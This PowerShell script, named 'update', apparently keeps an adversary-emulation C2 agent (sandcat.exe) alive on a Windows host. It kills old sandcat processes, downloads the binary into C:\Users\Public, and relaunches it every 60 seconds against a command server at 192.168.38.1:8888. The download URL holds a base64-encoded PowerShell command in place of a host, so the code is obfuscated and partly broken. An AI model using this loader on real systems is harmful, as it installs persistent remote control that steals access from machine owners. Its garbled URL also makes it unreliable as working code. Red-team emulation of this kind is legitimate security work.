function update
{
    $OldPids = Gwmi Win32_Process -Filter "Name='sandcat.exe'" | Select -Property ParentProcessId,ProcessId
    if ($OldPids) 
    {
        echo "[*] sandcat.exe is running"
        ForEach-Object -InputObject $OldPids -Process { try { Stop-Process $_.ProcessId; Stop-Process $_.ParentProcessId } catch { "[!] could not kill sandcat.exe" }} 
    } 
    else 
    { 
        echo "[!] sandcat.exe is not running" 
    }
    $SandcatPath = "C:\Users\Public\sandcat.exe"
    while($true)
    {
        if(!(Test-Path $SandcatPath))
        {
            $url="SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7AHUAcABkAGEAdABlAA==/file/download"
            $wc=New-Object System.Net.WebClient
            $wc.Headers.add("file","sandcat.exe")
            $output="C:\Users\Public\sandcat.exe"
            $wc.DownloadFile($url,$output)
        }
        C:\Users\Public\sandcat.exe http://192.168.38.1:8888 diy_eval
        sleep -Seconds 60
    }
}